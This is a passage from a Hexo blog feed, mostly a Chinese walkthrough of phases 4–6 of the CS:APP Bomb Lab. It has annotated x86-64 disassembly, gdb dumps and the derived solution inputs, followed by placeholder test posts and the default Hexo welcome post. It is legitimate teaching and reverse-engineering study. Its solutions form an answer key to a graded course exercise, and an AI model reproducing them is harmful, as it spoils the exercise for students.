class="hljs-number">89</span> d0                <span class="hljs-keyword">mov</span>    %edx,%eax        #<span class="hljs-built_in">edx</span>-&gt;<span class="hljs-built_in">eax</span><br>  400fd4:<span class="hljs-number">29</span> f0                <span class="hljs-keyword">sub</span>    %esi,%eax#<span class="hljs-built_in">eax</span>=<span class="hljs-built_in">eax</span>-<span class="hljs-built_in">esi</span>=<span class="hljs-built_in">edx</span>-<span class="hljs-built_in">esi</span><br>  400fd6:<span class="hljs-number">89</span> c1                <span class="hljs-keyword">mov</span>    %eax,%ecx        #<span class="hljs-built_in">ecx</span>=<span class="hljs-built_in">eax</span><br>  400fd8:c1 e9 1f             <span class="hljs-keyword">shr</span>    <span class="hljs-number">$0</span>x1f,%ecx#<span class="hljs-built_in">ecx</span>=&gt;&gt;<span class="hljs-number">31</span><br>  400fdb:<span class="hljs-number">01</span> c8                <span class="hljs-keyword">add</span>    %ecx,%eax        #<span class="hljs-built_in">eax</span>=<span class="hljs-built_in">ecx</span>+<span class="hljs-built_in">eax</span><br>  400fdd:d1 f8                <span class="hljs-keyword">sar</span>    %eax             #<span class="hljs-built_in">eax</span>=&gt;&gt;<span class="hljs-number">1</span>          综上 <span class="hljs-built_in">eax</span>=((<span class="hljs-built_in">edx</span>-<span class="hljs-built_in">esi</span>)&gt;&gt;<span class="hljs-number">31</span>+<span class="hljs-built_in">edx</span>-<span class="hljs-built_in">esi</span>)&gt;&gt;<span class="hljs-number">1</span><br>  400fdf:<span class="hljs-number">8d</span> 0c <span class="hljs-number">30</span>             <span class="hljs-keyword">lea</span>    (%rax,%rsi,<span class="hljs-number">1</span>),%ecx     #<span class="hljs-built_in">ecx</span>=<span class="hljs-built_in">rax</span>+<span class="hljs-built_in">rsi</span>=((<span class="hljs-built_in">edx</span>-<span class="hljs-built_in">esi</span>)&gt;&gt;<span class="hljs-number">31</span>+<span class="hljs-built_in">edx</span>-<span class="hljs-built_in">esi</span>)&gt;&gt;<span class="hljs-number">1</span>+<span class="hljs-built_in">esi</span><br>  400fe2:<span class="hljs-number">39</span> f9                <span class="hljs-keyword">cmp</span>    %edi,%ecx               <br>  400fe4:7e 0c                <span class="hljs-keyword">jle</span>    400ff2 &lt;func4+<span class="hljs-number">0x24</span>&gt;           #<span class="hljs-built_in">ecx</span>&lt;=<span class="hljs-built_in">edi</span>        -&gt;&gt;<span class="hljs-number">1</span><br>  400fe6:<span class="hljs-number">8d</span> <span class="hljs-number">51</span> ff             <span class="hljs-keyword">lea</span>    -<span class="hljs-number">0x1</span>(%rcx),%edx<br>  400fe9:e8 e0 ff ff ff       callq  400fce &lt;func4&gt;<br>  400fee:<span class="hljs-number">01</span> c0                <span class="hljs-keyword">add</span>    %eax,%eax<br>  400ff0:eb <span class="hljs-number">15</span>                <span class="hljs-keyword">jmp</span>    <span class="hljs-number">401007</span> &lt;func4+<span class="hljs-number">0x39</span>&gt;         #return <br>  400ff2:b8 <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       <span class="hljs-keyword">mov</span>    <span class="hljs-number">$0</span>x0,%eax                                      #-&lt;&lt;<span class="hljs-number">1</span><br>  400ff7:<span class="hljs-number">39</span> f9                <span class="hljs-keyword">cmp</span>    %edi,%ecx<br>  400ff9:<span class="hljs-number">7d</span> 0c                <span class="hljs-keyword">jge</span>    <span class="hljs-number">401007</span> &lt;func4+<span class="hljs-number">0x39</span>&gt;         #<span class="hljs-built_in">ecx</span>&gt;=<span class="hljs-built_in">edi</span> return<br>  400ffb:<span class="hljs-number">8d</span> <span class="hljs-number">71</span> <span class="hljs-number">01</span>             <span class="hljs-keyword">lea</span>    <span class="hljs-number">0x1</span>(%rcx),%esi         <br>  400ffe:e8 cb ff ff ff       callq  400fce &lt;func4&gt;<br>  <span class="hljs-number">401003</span>:<span class="hljs-number">8d</span> <span class="hljs-number">44</span> <span class="hljs-number">00</span> <span class="hljs-number">01</span>          <span class="hljs-keyword">lea</span>    <span class="hljs-number">0x1</span>(%rax,%rax,<span class="hljs-number">1</span>),%eax<br>  <span class="hljs-number">401007</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c4 <span class="hljs-number">08</span>          <span class="hljs-keyword">add</span>    <span class="hljs-number">$0</span>x8,%rsp<br>  40100b:c3                   retq   <br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ecx&lt;=edi             #   400fe4:7e 0c                jle    400ff2 &lt;func4+0x24&gt;  <br>ecx&gt;=edi return 0         # 400ff9:7d 0c                jge    401007 &lt;func4+0x39&gt;  <br>ecx&lt;edi <br>esi=ecx+1<br>return 2*func(edi,esi,edx)+1<br>ecx&gt;edi <br>edx=rcx-1<br>return 2*func(edi,esi,edx)                    #  400fe9:e8 e0 ff ff ff       callq  400fce &lt;func4&gt;<br><br></code></pre></td></tr></table></figure><p>易知当ecx&#x3D;&#x3D;edi时，func4返回0；而<code>ecx=((edx-esi)&gt;&gt;31+edx-esi)&gt;&gt;1+esi=7</code></p><p>故答案 7 0</p><h2 id="pahse-5-下标取数"><a href="#pahse-5-下标取数" class="headerlink" title="pahse 5  下标取数"></a>pahse 5  下标取数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs assembly">0000000000401062 &lt;phase_5&gt;:  #rdi string<br>  401062:53                   push   %rbx      <br>  401063:48 83 ec 20          sub    $0x20,%rsp<br>  401067:48 89 fb             mov    %rdi,%rbx             #rbx保存了rdi<br>  40106a:64 48 8b 04 25 28 00 mov    %fs:0x28,%rax             <br>  401071:00 00 <br>  401073:48 89 44 24 18       mov    %rax,0x18(%rsp)<br>  401078:31 c0                xor    %eax,%eax<br>  40107a:e8 9c 02 00 00       callq  40131b &lt;string_length&gt;       #rdi是phase5输入的字符串               <br>  40107f:83 f8 06             cmp    $0x6,%eax         #字符串长度是否为6 不是则错误<br>  401082:74 4e                je     4010d2 &lt;phase_5+0x70&gt;                          #---&gt;&gt;1<br>  401084:e8 b1 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  401089:eb 47                jmp    4010d2 &lt;phase_5+0x70&gt;<br>  40108b:0f b6 0c 03          movzbl (%rbx,%rax,1),%ecx        #(rax是偏移量) 取rdi的第rax个字符    #-----&lt;&lt;2   <br>  40108f:88 0c 24             mov    %cl,(%rsp)<br>  401092:48 8b 14 24          mov    (%rsp),%rdx<br>  401096:83 e2 0f             and    $0xf,%edx               #取字符值ascii值的后4位  写入edx<br>  401099:0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx      #以0x4024b0作为基址  edx作为偏移  取一个字节存入edx<br>  4010a0:88 54 04 10          mov    %dl,0x10(%rsp,%rax,1)#把edx中的值写入（%rsp)+0x10+(%rax)的栈处<br>  4010a4:48 83 c0 01          add    $0x1,%rax                #rax加1  知道其为6 依次取出了edi的6个字符<br>  4010a8:48 83 f8 06          cmp    $0x6,%rax<br>  4010ac:75 dd                jne    40108b &lt;phase_5+0x29&gt;                               #-----&gt;&gt;2<br>  4010ae:c6 44 24 16 00       movb   $0x0,0x16(%rsp)                <br>  4010b3:be 5e 24 40 00       mov    $0x40245e,%esi<br>  4010b8:48 8d 7c 24 10       lea    0x10(%rsp),%rdi           #(%rsp)+0x10是我们前面构造的字符串的起点 <br>  4010bd:e8 76 02 00 00       callq  401338 &lt;strings_not_equal&gt;<br>  4010c2:85 c0                test   %eax,%eax              <br>  4010c4:74 13                je     4010d9 &lt;phase_5+0x77&gt;       #eax==0   phase_5正常return <br>  4010c6:e8 6f 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>  4010cb:0f 1f 44 00 00       nopl   0x0(%rax,%rax,1)<br>  4010d0:eb 07                jmp    4010d9 &lt;phase_5+0x77&gt;<br>  4010d2:b8 00 00 00 00       mov    $0x0,%eax                                      #---&lt;&lt;1<br>  4010d7:eb b2                jmp    40108b &lt;phase_5+0x29&gt;                          #------&gt;&gt;2<br>  4010d9:48 8b 44 24 18       mov    0x18(%rsp),%rax<br>  4010de:64 48 33 04 25 28 00 xor    %fs:0x28,%rax<br>  4010e5:00 00 <br>  4010e7:74 05                je     4010ee &lt;phase_5+0x8c&gt;<br>  4010e9:e8 42 fa ff ff       callq  400b30 &lt;__stack_chk_fail@plt&gt;<br>  4010ee:48 83 c4 20          add    $0x20,%rsp<br>  4010f2:5b                   pop    %rbx<br>  4010f3:c3                   retq   <br></code></pre></td></tr></table></figure><p>如下截图 需要<code>(%rsp)+0x10</code>处开始的字符串为flyers</p><p><img src="/project/./image/2,bomb_lab_image/image-20240504203709620.png" alt="image-20240504203709620"></p><p><img src="/project/./image/2,bomb_lab_image/image-20240504201927217.png" alt="image-20240504201927217"></p><p>​</p><p>找到flyers</p><p>而<code>(%rsp)+0x10</code>是从下面构造的</p><p><img src="/project/./image/2,bomb_lab_image/image-20240504202617625.png" alt="image-20240504202617625"></p><p><code>  401099:0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx      #以0x4024b0作为基址  edx作为偏移  取一个字节存入edx</code></p><p><img src="/project/./image/2,bomb_lab_image/image-20240504202432310.png" alt="image-20240504202432310"></p><p>rbx是输入的字符串参数的指针  rax是其下标i </p><p>上述汇编做的运算为取char的后4位，然后作为下标 ， 在“maduier…”中寻找字符</p><p><img src="/project/./image/2,bomb_lab_image/image-20240504203035922.png" alt="image-20240504203035922"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flyers</span>在<span class="hljs-string">&quot;maduier...&quot;</span>中的下标为：  <br><span class="hljs-attribute">f</span>:<span class="hljs-number">9</span>   <br><span class="hljs-attribute">l</span>:<span class="hljs-number">15</span>  需要char字符后四位为f（<span class="hljs-number">15</span>）   <span class="hljs-number">0</span>x4f-&gt;O          <br><span class="hljs-attribute">y</span>:<span class="hljs-number">14</span>  需要char字符后四位为e（<span class="hljs-number">14</span>）   <span class="hljs-number">0</span>x4e-&gt;N<br><span class="hljs-attribute">e</span>:<span class="hljs-number">5</span>    <span class="hljs-number">0</span>x35-&gt;<span class="hljs-number">5</span><br><span class="hljs-attribute">r</span>:<span class="hljs-number">6</span> <br><span class="hljs-attribute">s</span> <span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><p>故答案可以是 9ON567            （不唯一）</p><h2 id="phase-6-node重排"><a href="#phase-6-node重排" class="headerlink" title="phase 6 node重排"></a>phase 6 node重排</h2><p>phase6的汇编稍微有点长</p><p>首先看到 像phase2一样，要求写入六个数</p><h4 id="输入要求-小于等于6且不相同的正数"><a href="#输入要求-小于等于6且不相同的正数" class="headerlink" title="输入要求 小于等于6且不相同的正数"></a>输入要求 小于等于6且不相同的正数</h4><p>我们查看一下这段代码</p><p>注意rsp存放了我们的6个数 每个数占4个字节</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs assembly">401100:49 89 e5             mov    %rsp,%r13          #rsp-&gt;r13<br>401103:48 89 e6             mov    %rsp,%rsi <br>401106:e8 51 03 00 00       callq  40145c &lt;read_six_numbers&gt;<br>40110b:49 89 e6             mov    %rsp,%r14           #rsp-&gt;r14<br>40110e:41 bc 00 00 00 00    mov    $0x0,%r12d#r12d=0<br>401114:4c 89 ed             mov    %r13,%rbp#r13-&gt;rbp             #-&lt;&lt;&lt;4<br>401117:41 8b 45 00          mov    0x0(%r13),%eax#rax=(rsp)<br>40111b:83 e8 01             sub    $0x1,%eax#rax-1<br>40111e:83 f8 05             cmp    $0x5,%eax<br>401121:76 05                jbe    401128 &lt;phase_6+0x34&gt;#需要rax&lt;=5      -&gt;&gt;&gt;1<br>401123:e8 12 03 00 00       callq  40143a &lt;explode_bomb&gt;<br>401128:41 83 c4 01          add    $0x1,%r12d               #r12d++          -&lt;&lt;&lt;1<br>40112c:41 83 fc 06          cmp    $0x6,%r12d              <br>401130:74 21                je     401153 &lt;phase_6+0x5f&gt;     #r12d==6  则跳   -&gt;&gt;&gt;2<br>401132:44 89 e3             mov    %r12d,%ebx                #rbx用于计算偏移   -&lt;&lt;&lt;3<br>401135:48 63 c3             movslq %ebx,%rax<br>401138:8b 04 84             mov    (%rsp,%rax,4),%eax         #rbx*4作为偏移 即取下一个数 <br>40113b:39 45 00             cmp    %eax,0x0(%rbp)  #需要下一个数不等于rbp指向的数<br>40113e:75 05                jne    401145 &lt;phase_6+0x51&gt;<br>401140:e8 f5 02 00 00       callq  40143a &lt;explode_bomb&gt;<br>401145:83 c3 01             add    $0x1,%ebx                 #rbx++<br>401148:83 fb 05             cmp    $0x5,%ebx<br>40114b:7e e8                jle    401135 &lt;phase_6+0x41&gt;       #rbx&lt;=5         -&gt;&gt;&gt;3   <br>40114d:49 83 c5 04          add    $0x4,%r13                   #rbx=6时 r13+4<br>401151:eb c1                jmp    401114 &lt;phase_6+0x20&gt;                      #-&gt;&gt;&gt;4<br>401153:48 8d 74 24 18       lea    0x18(%rsp),%rsi                              #-&lt;&lt;&lt;2<br></code></pre></td></tr></table></figure><p>上述代码实现的效果相当于</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">r13=(%rsp）<br><span class="hljs-keyword">for</span>(r12d=<span class="hljs-number">1</span>;r12d++;r12d&lt;<span class="hljs-number">6</span>)&#123;<br><span class="hljs-keyword">if</span> ((r13)<span class="hljs-number">-1</span>&gt;<span class="hljs-number">5</span>)  explode;<br><span class="hljs-keyword">for</span>(rbx=<span class="hljs-number">0</span>;rbx++;rbxx&lt;=<span class="hljs-number">5</span>)&#123;<br><span class="hljs-keyword">if</span>((r13d+rbx*<span class="hljs-number">4</span>)==(r13d))  explode;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>即6个数不能相等 且小于等于6</p><p>我们随便输入6 3 2 5 1 4</p><p>执行完<code>│   0x401106 &lt;phase_6+18&gt;   callq  0x40145c &lt;read_six_numbers&gt;  </code>之后，查看栈区，正好是我们写入的6的数</p><img src="./image/2,bomb_lab_image/image-20240511150448490.png" alt="image-20240511150448490" style="zoom:67%;" /><figure class="highlight plaintext"><figcaption><span>x/6wd $rsp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs (gdb)">0x7fffffffdab0: 6       3       2       5<br>0x7fffffffdac0: 1       4<br></code></pre></td></tr></table></figure><h4 id="继续分析-被7减"><a href="#继续分析-被7减" class="headerlink" title="继续分析 被7减"></a>继续分析 被7减</h4><p>查看下面代码</p><p>注意r14 rsi此时存的是rsp</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">401153</span>:<span class="hljs-number">48</span> <span class="hljs-number">8</span>d <span class="hljs-number">74</span> <span class="hljs-number">24</span> <span class="hljs-number">18</span>       lea    <span class="hljs-number">0</span>x18(%rsp),%rsi<br><span class="hljs-attribute">401158</span>:<span class="hljs-number">4</span>c <span class="hljs-number">89</span> f0             mov    %r14,%rax<br><span class="hljs-attribute">40115b</span>:b9 <span class="hljs-number">07</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>       mov    $<span class="hljs-number">0</span>x7,%ecx<br><span class="hljs-attribute">401160</span>:<span class="hljs-number">89</span> ca                mov    %ecx,%edx<br><span class="hljs-attribute">401162</span>:<span class="hljs-number">2</span>b <span class="hljs-number">10</span>                sub    (%rax),%edx<br><span class="hljs-attribute">401164</span>:<span class="hljs-number">89</span> <span class="hljs-number">10</span>                mov    %edx,(%rax)<br><span class="hljs-attribute">401166</span>:<span class="hljs-number">48</span> <span class="hljs-number">83</span> c0 <span class="hljs-number">04</span>          add    $<span class="hljs-number">0</span>x4,%rax<br><span class="hljs-attribute">40116a</span>:<span class="hljs-number">48</span> <span class="hljs-number">39</span> f0             cmp    %rsi,%rax<br><span class="hljs-attribute">40116d</span>:<span class="hljs-number">75</span> f1                jne    <span class="hljs-number">401160</span> &lt;phase_6+<span class="hljs-number">0</span>x6c&gt;<br></code></pre></td></tr></table></figure><p>易知其效果是：用7减去这6个数 得到新的数</p><p>我们的输入为6 3 2 5 1 4 ；此时变成 </p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">(gdb) x/6wd $rsp<br>0x7fffffffdab0:<span class="hljs-number"> 1 </span>     <span class="hljs-number"> 4 </span>     <span class="hljs-number"> 5 </span>      2<br>0x7fffffffdac0:<span class="hljs-number"> 6 </span>      3<br></code></pre></td></tr></table></figure><h4 id="链表重排"><a href="#链表重排" class="headerlink" title="链表重排"></a>链表重排</h4><p>继续查看汇编</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs assembly">40116f:be 00 00 00 00       mov    $0x0,%esi                                    #rsi用于取输入的数  1 4 5 2 6 3<br>401174:eb 21                jmp    401197 &lt;phase_6+0xa3&gt;                         #-&gt;&gt;&gt;1<br>401176:48 8b 52 08          mov    0x8(%rdx),%rdx                      #链表跳转 取到下一个node的地址      -&lt;&lt;&lt;3         <br>40117a:83 c0 01             add    $0x1,%eax                                     #eax++<br>40117d:39 c8                cmp    %ecx,%eax<br>40117f:75 f5                jne    401176 &lt;phase_6+0x82&gt;                         #eax!=ecx   直到相等 -&gt;&gt;&gt;3  <br>401181:eb 05                jmp    401188 &lt;phase_6+0x94&gt;#-&gt;&gt;&gt;&gt;4<br>401183:ba d0 32 60 00       mov    $0x6032d0,%edx                             #-&gt;&gt;&gt;2<br>401188:48 89 54 74 20       mov    %rdx,0x20(%rsp,%rsi,2)   #edx存了个地址$0x6032d0  将其放入(%rsp)=+20   #-&lt;&lt;&lt;4<br>40118d:48 83 c6 04          add    $0x4,%rsi                     #rsi+=4<br>401191:48 83 fe 18          cmp    $0x18,%rsi<br>401195:74 14                je     4011ab &lt;phase_6+0xb7&gt;<br>401197:8b 0c 34             mov    (%rsp,%rsi,1),%ecx          #取栈顶rsp处的数放入ecx      -&lt;&lt;&lt;1<br>40119a:83 f9 01             cmp    $0x1,%ecx                   <br>40119d:7e e4                jle    401183 &lt;phase_6+0x8f&gt;             #ecx&lt;=1   -&gt;&gt;&gt;2<br>40119f:b8 01 00 00 00       mov    $0x1,%eax         <br>4011a4:ba d0 32 60 00       mov    $0x6032d0,%edx                 <br>4011a9:eb cb                jmp    401176 &lt;phase_6+0x82&gt;                      #-&gt;&gt;&gt;3<br> <br></code></pre></td></tr></table></figure><p>我们查看一下&#96;&#96;&#96;x&#x2F;gx 0x6032d0&#96;&#96;，可以看到这是个链表结构体，nodei存放的是值，nodei+8存放的是下一个node的地址。</p><p>且其指向是node1-&gt;node2-&gt;3-&gt;4-&gt;5-&gt;6</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs assembly">x/gx 0x6032d0<br>0x6032d0 &lt;node1&gt;:       0x000000010000014c<br>0x6032d8 &lt;node1+8&gt;:     0x00000000006032e0     #  &amp;node2<br>0x6032e0 &lt;node2&gt;:       0x00000002000000a8<br>0x6032e8 &lt;node2+8&gt;:     0x00000000006032f0<br>0x6032f0 &lt;node3&gt;:       0x000000030000039c<br>0x6032f8 &lt;node3+8&gt;:     0x0000000000603300<br>0x603300 &lt;node4&gt;:       0x00000004000002b3<br>0x603308 &lt;node4+8&gt;:     0x0000000000603310<br>0x603310 &lt;node5&gt;:       0x00000005000001dd<br>0x603318 &lt;node5+8&gt;:     0x0000000000603320<br>0x603320 &lt;node6&gt;:       0x00000006000001bb<br>0x603328 &lt;node6+8&gt;:     0x0000000000000000<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span>&#123;</span><br><span class="hljs-type">long</span> num;<br>node* next;<br>&#125;<br></code></pre></td></tr></table></figure><p>而上述汇编的效果是，将nodei的地址按照1 4 5 2 6 3的顺序放入以(%rsp)+0x20开始的栈区。查看一下该栈区</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) x/gx 0x7fffffffdad0<br>0x7fffffffdad0: 0x00000000006032d0           #node1<br>0x7fffffffdad8: 0x0000000000603300           #node4<br>0x7fffffffdae0: 0x0000000000603310           #node5<br>0x7fffffffdae8: 0x00000000006032e0          #node2<br>0x7fffffffdaf0: 0x0000000000603320#node6<br>0x7fffffffdaf8: 0x00000000006032f0          #node3<br></code></pre></td></tr></table></figure><p>继续分析汇编代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">4011ab:48 8b 5c 24 20       mov    0x20(%rsp),%rbx     #rbx存放栈区基址rsp+0x20=0x7fffffffdad0处的node地址0x6032d0<br>4011b0:48 8d 44 24 28       lea    0x28(%rsp),%rax             #rax 是栈区第二个node地址    0x7fffffffdad8<br>4011b5:48 8d 74 24 50       lea    0x50(%rsp),%rsi             #rsi 存放栈区末尾地址   0x7fffffffdb00      <br>4011ba:48 89 d9             mov    %rbx,%rcx                   <br>4011bd:48 8b 10             mov    (%rax),%rdx<br>4011c0:48 89 51 08          mov    %rdx,0x8(%rcx)             #改变node的指向<br>4011c4:48 83 c0 08          add    $0x8,%rax<br>4011c8:48 39 f0             cmp    %rsi,%rax<br>4011cb:74 05                je     4011d2 &lt;phase_6+0xde&gt;<br>4011cd:48 89 d1             mov    %rdx,%rcx<br>4011d0:eb eb                jmp    4011bd &lt;phase_6+0xc9&gt;<br></code></pre></td></tr></table></figure><p>上述汇编使得 链表重连 1-&gt;4-&gt;5-&gt;2-&gt;6-&gt;3</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">(gdb) x/gx 0x6032d0<br>0x6032d0 &lt;node1&gt;:       0x000000010000014c<br>0x6032d8 &lt;node1+8&gt;:     0x0000000000603300       # &amp;node4<br>0x6032e0 &lt;node2&gt;:       0x00000002000000a8 <br>0x6032e8 &lt;node2+8&gt;:     0x0000000000603320       <br>0x6032f0 &lt;node3&gt;:       0x000000030000039c<br>0x6032f8 &lt;node3+8&gt;:     0x0000000000603300<br>0x603300 &lt;node4&gt;:       0x00000004000002b3<br>0x603308 &lt;node4+8&gt;:     0x0000000000603310       # &amp;node5  <br>0x603310 &lt;node5&gt;:       0x00000005000001dd<br>0x603318 &lt;node5+8&gt;:     0x00000000006032e0       # &amp;node2<br>0x603320 &lt;node6&gt;:       0x00000006000001bb<br>0x603328 &lt;node6+8&gt;:     0x00000000006032f0<br></code></pre></td></tr></table></figure><h4 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h4><p>后续汇编要求重连后node连接由大到小  即node3 4 5 6 1 2（node值由大到小排列）</p><p>故输入应数字为4 3 2 1 6 5，其被7减后变为3 4 5 6 1 2 这就是我们需要的node指向</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>test-2</title>
    <link href="/project/2025/05/24/test-1/"/>
    <url>/project/2025/05/24/test-1/</url>
    
    <content type="html"><![CDATA[<p>222</p><p>测试</p>]]></content>
    
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>test</title>
    <link href="/project/2025/05/24/test/"/>
    <url>/project/2025/05/24/test/</url>
    
    <content type="html"><![CDATA[<p>111</p><p>测试文章</p>]]></content>
    
    
    
    <tags>
      
      <tag>test</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/project/2025/05/23/hello-world/"/>
    <url>/project/2025/05/23/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
